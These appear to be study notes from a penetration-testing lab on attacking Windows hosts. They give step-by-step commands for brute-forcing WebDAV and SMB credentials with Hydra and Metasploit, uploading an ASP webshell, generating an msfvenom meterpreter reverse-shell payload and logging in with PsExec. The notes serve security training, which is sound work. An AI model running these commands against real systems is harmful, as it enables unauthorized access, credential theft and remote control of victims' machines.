# Host Based Attacks

- Targeted against a specific host/system

## Overview over Windows vulnerabilities

**Types of windows vulnerabilities (not complete)**

- Information Disclosure
- buffer overflows
- Remote code execution
- privilege escalation
- Denial of Service

**Frequently Exploited Windows services**

- **|** Microsoft IIS **|** TCP Ports 80/443 **|** Proprietary web server **|**
- **|** WebDav(Web Distributed Authoring & versioning) **|** TCP Ports 80/443 **|** HTTP extention that Allows client to update, delete , move and copy files on a web server. WebDAV is used to enable a web server to act as a file server. **|**
- **|** SMB/CIFS(Server Message Block Protocol) **|** TCP port 445 **|** Network file share on a LAN **|**
- **|** RDP **|** TCP port 3389 **|** Remotely authenticate and interact with a Windows system **|**
- WinRM(Windows Remote Management Protocol) **|** TCP ports 5986/443 **|** Windows remote management protocol that can be used to facilitate remote access with windows systems. **|**

**Exploiting Microsoft IIS WebDAV**
Configured to run on ports 80/443

- Supported executable file extentions: .asp, .aspx, .config, .php
- edits and manage files
- connect through credentials
  _Tools_

  - davtest - used to scan, authenticate and exploit a WebDAV server
  - cadaver - cadaver supports file upload, download, on-screen display etc

  _Exploitation process_

  - Identify whether WebDav has been configured to run on the IIS web server
  - brute-force attact on order to identify legitamate credentials we can use for authentication

  * authenticate then upload a malicious .asp payload that can be used to execute arbitary commands or optain a reverse shell on the target

  _Step-by step_

  1. Do nmap scan: `nmap -sV -sC 10.10.x.x`
  2. after identifying IIS Web DAV: `nmap -sV -p 80 --script= http-enum 10.10.x.x`
  3. go to browser `10.10.x.x/webdev` , here you can authenticate once you have credentials
  4. Hydra to brute force: `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_paswords.txt 10.10.x.x http-get /webdav/`, example wordlist(that might work)
  5. log in
  6. use davtest: `davtest -auth username:password -url http://10.10.x.x/webdav `, will whow you what files can be uploded and files that can be executed, the last is important and shows us an attack vector
  7. use cadaver to upload file: `cadaver http://10.10.x.x/webdav`, then authenticate.
  8. upload a webshell(asp) through cadaver when connected: `put /usr/share/webshells/asp/webshell.asp`.
  9. Go to browser again to see if it has been uploaded and click on the .asp file, then run commands on the page: to look at C:\ drive type `dir C:\` , to see file(flag.txt), type `type C:\flag.txt`

_with metasploit_

1.  scan first to check if IIS Web DAV is there
2.  create your own payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=1234 -f asp > shell.asp`
3.  open cadaver and connect to the webdav: `cadaver http://10.10.x.x/webdav` , then upload the shell file: `put /root/shell.asp`
4.  start postgres server and msfconsole: `service postgresql start && msfconsole`.
5.  msfconsole: `use multi/handler` , `set payload /windows/meterpreter/reverse_tcp `, `set LHOST and LPORT`(same as shell.asp), hit `run`
6.  open browser and click on the shell.asp file that was uploaded
7.  find what you are looking for.
8.  _You can use a metaasploit script for automating all of it_. in msfconsole `search iis upload`, looking for exploit/windows/iis/iis_webdav_upload_asp

**Exploiting SMB with PsExec**

- user authentication
- share authentication

1. nmap sca `nmap -sV -sC 10.10.x.x`
2. smb brute force, start msfconsole: `service postgresql start && msfconsole`
3. msfconsole: `serach smb_login` and use.
4. set options:
   - `set RHOSTS`,
   - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`,
   - `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_user.txt`,
   - `set VERBOSE false` < - for only succeced attempts
5. use psexec.py to login with found credentials: `psecexec.py Administrator@10.10.x.x cmd.exe`, fill in the passwords

_use psexec with metasploit_

1. in msfconsole search: `search psexec`, looking for`exploit/windows/smb/psexec`, fill in options
